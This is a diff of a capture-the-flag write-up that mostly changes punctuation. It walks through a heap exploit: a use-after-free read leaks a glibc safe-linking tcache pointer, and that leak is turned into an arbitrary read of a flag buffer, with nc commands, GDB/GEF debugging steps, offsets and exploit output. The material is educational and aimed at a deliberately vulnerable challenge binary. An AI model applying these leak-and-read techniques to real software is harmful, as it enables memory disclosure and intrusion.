@@ -21,7 +21,7 @@ tags: ["pwn", "heap"]
 
 ## TL;DR
 
-Option 4 is a free arbitrary read (`printf("%s", user_pointer)`) — but PIE + heap ASLR means you don't know *what* address to ask for. That's the title. A UAF read on a tcache'd chunk leaks glibc's safe-linking mangled `fd`, which for the first chunk in an empty bin is exactly `chunk_addr >> 12`. Shift back, add `0x490`, read the flag.
+Option 4 is a free arbitrary read (`printf("%s", user_pointer)`) - but PIE + heap ASLR means you don't know *what* address to ask for. That's the title. A UAF read on a tcache'd chunk leaks glibc's safe-linking mangled `fd`, which for the first chunk in an empty bin is exactly `chunk_addr >> 12`. Shift back, add `0x490`, read the flag.
 
 ```
 1 (allocate) → 2 (free) → 3 (read → leak) → 4 (read at (leak<<12) + 0x490)
@@ -35,17 +35,17 @@ case 3: assert(item != NULL); puts(item); break;
 case 4: { char *ptr; scanf("%p%*c", (void*)&ptr); printf("%s\n", ptr); } break;
 ```
 
-1. **`chal.c:43`** — `free(item)` never nulls `item`. The fix is commented out, and even uncommented, `item == NULL;` is a *comparison*, not an assignment.
-2. **`chal.c:48`** — `puts(item)` on the dangling pointer → **UAF read**.
-3. **`chal.c:55`** — `printf("%s", scanf("%p"))` → **arbitrary read**.
+1. **`chal.c:43`** - `free(item)` never nulls `item`. The fix is commented out, and even uncommented, `item == NULL;` is a *comparison*, not an assignment.
+2. **`chal.c:48`** - `puts(item)` on the dangling pointer → **UAF read**.
+3. **`chal.c:55`** - `printf("%s", scanf("%p"))` → **arbitrary read**.
 
-The `assert` guards check "was this ever allocated", not "is this still valid" — after a free, `item` is non-NULL and both pass.
+The `assert` guards check "was this ever allocated", not "is this still valid" - after a free, `item` is non-NULL and both pass.
 
 The flag is `malloc`'d at startup and never used again, so the whole challenge is: leak one heap address, then point option 4 at the flag buffer.
 
-## Step 1 — Leak via safe-linking
+## Step 1: Leak via safe-linking
 
-`malloc(0x20)` → 0x30 chunk → on free it goes to **tcache**, which writes into the chunk's *user data* and doesn't scrub the rest — and `item` still points there:
+`malloc(0x20)` → 0x30 chunk → on free it goes to **tcache**, which writes into the chunk's *user data* and doesn't scrub the rest - and `item` still points there:
 
 ```c
 typedef struct tcache_entry {
@@ -66,11 +66,11 @@ printf '1\n2\n3\n' | nc <host> <port> | xxd
 00000040: 6963 653e 204e 43c1 5605 0a63 686f 6963  ice> NC.V..choic
 ```
 
-`4e 43 c1 56 05` = `0x0556c1434e`. Exactly 5 bytes: a 48-bit address >> 12 leaves 36 bits, and byte 6 is `0x00` — which is what terminates `puts`. The leak self-delimits, and the `key` at `mem+8` stays hidden behind that NUL.
+`4e 43 c1 56 05` = `0x0556c1434e`. Exactly 5 bytes: a 48-bit address >> 12 leaves 36 bits, and byte 6 is `0x00` - which is what terminates `puts`. The leak self-delimits, and the `key` at `mem+8` stays hidden behind that NUL.
 
 `leak << 12` = the page `item` sits on.
 
-## Step 2 — Find the offset
+## Step 2: Find the offset
 
 `leak << 12` destroys the low 12 bits, so the flag's offset within that page must come from the (deterministic) startup allocation layout. Host glibc is 2.42 and the target 2.39, so debug **inside the pinned image**:
 
@@ -96,7 +96,7 @@ docker run --rm -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
   wimp-dbg gdb -q -x /work/gef.py /work/chal
 ```
 
-`binutils` is required — GEF shells out to `readelf` and dies silently without it. The UTF-8 env stops its `➤` prompt throwing `UnicodeEncodeError`.
+`binutils` is required - GEF shells out to `readelf` and dies silently without it. The UTF-8 env stops its `➤` prompt throwing `UnicodeEncodeError`.
 
 ```
 break 'free@plt'        # PLT stub = the program's own free only; plain `break free`
@@ -114,11 +114,11 @@ Chunk(addr=0x55555555a4b0, size=0x30)    item
 Chunk(addr=0x55555555a4e0, size=0x1fb30) top
 ```
 
-(GEF renders `IS_MMAPPED | NON_MAIN_ARENA` on every chunk — a display bug. `x/gx 0x555555559008` gives `0x291`, i.e. `PREV_INUSE` only.)
+(GEF renders `IS_MMAPPED | NON_MAIN_ARENA` on every chunk - a display bug. `x/gx 0x555555559008` gives `0x291`, i.e. `PREV_INUSE` only.)
 
 The flag exists **twice**: stdio reads the file into its own 4 KiB buffer (allocated by the first `fseek`, via `_IO_file_seekoff`), then `fgets` copies it into the `malloc`'d buffer.
 
-Critically, `leak << 12` is **not** the heap base — `item` is at `heap+0x14b0`, and `0x14b0 >> 12 == 1`, so the leak lands one page *into* the heap:
+Critically, `leak << 12` is **not** the heap base - `item` is at `heap+0x14b0`, and `0x14b0 >> 12 == 1`, so the leak lands one page *into* the heap:
 
 ```
 heap base   = 0x555555559000
@@ -131,7 +131,7 @@ stdio copy  = 0x555555559480   →  -0xb80
 
 General rule: **`leak << 12` recovers the page; the low 12 bits are gone and must come from known static layout.**
 
-## Step 3 — Exploit
+## Step 3: Exploit
 
 ```python
 #!/usr/bin/env python3
@@ -159,7 +159,7 @@ $ python3 exploit.py <host> <port>
 [+] Alpaca{...}
 ```
 
-Fully deterministic — no ASLR gamble, no brute force. It also survives a longer real flag: a bigger flag chunk pushes `item` to `heap+0x14c0` but leaves the flag chunk's own position untouched, and `item` stays on the same page.
+Fully deterministic - no ASLR gamble, no brute force. It also survives a longer real flag: a bigger flag chunk pushes `item` to `heap+0x14c0` but leaves the flag chunk's own position untouched, and `item` stays on the same page.
 
 ## Fix
 
